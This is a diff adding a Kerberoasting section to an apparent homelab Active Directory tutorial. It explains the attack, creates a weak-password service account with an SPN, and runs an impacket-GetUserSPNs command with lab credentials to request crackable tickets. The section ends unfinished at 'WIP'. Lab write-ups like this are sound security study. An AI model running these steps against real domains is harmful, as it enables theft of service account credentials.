@@ -137,3 +137,27 @@ xfreerdp /v:10.10.10.10 /d:homelab.local /u:alisha /p:"welcome1" /cert:ignore /d
 - The attack begins when an attacker has access to any authenticated domain user account. Using that account, they send a `TGS-REQ` (Ticket Granting Service Request) to the Key Distribution Center (KDC) for a service associated with a specific Service Principal Name (SPN). If the request is valid, the KDC returns a `TGS-REP` (Ticket Granting Service Reply) containing a service ticket
 
 - The service ticket is encrypted using the service account's key, which is derived from the service account's password. Although the attacker cannot directly decrypt the ticket, they can extract the encrypted service ticket and perform offline password cracking. For each password guess, they derive the corresponding Kerberos key and attempt to decrypt the ticket. If decryption succeeds, the guessed password (or its equivalent key) is correct, allowing the attacker to recover the service account's credentials
+
+- We will first create a service account named `sqlservice` with a weak password in the DC
+```
+New-ADUser -Name "sqlservice" -SamAccountName "sqlservice" -UserPrincipalName "sqlservice@homelab.local" -Enabled $true -AccountPassword(ConvertTo-SecureString "summer2000" -AsPlainText -Force)
+```
+- Then, I attached a SPN to that account
+```
+setspn -a MSSQLSvc/sql01.homelab.local:1433 sqlservice
+```
+- Lastly, I verified if the SPN was successfully registered
+```
+setspn -q MSSQLSvc/sql01.homelab.local:1433
+```
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/ce77dae9-cf0f-4cf9-9da2-3e5738e28136" />
+</p>
+
+- Now, we'll run a similar command to the one we used earlier to enumerate users, but this time we'll enumerate Service Principal Names (SPNs) and save it into `hash2.txt`
+```
+impacket-GetUserSPNs homelab.local/Alisha:welcome1 -dc-ip 10.10.10.10 -request
+```
+<p align="center">
+WIP
+</p>
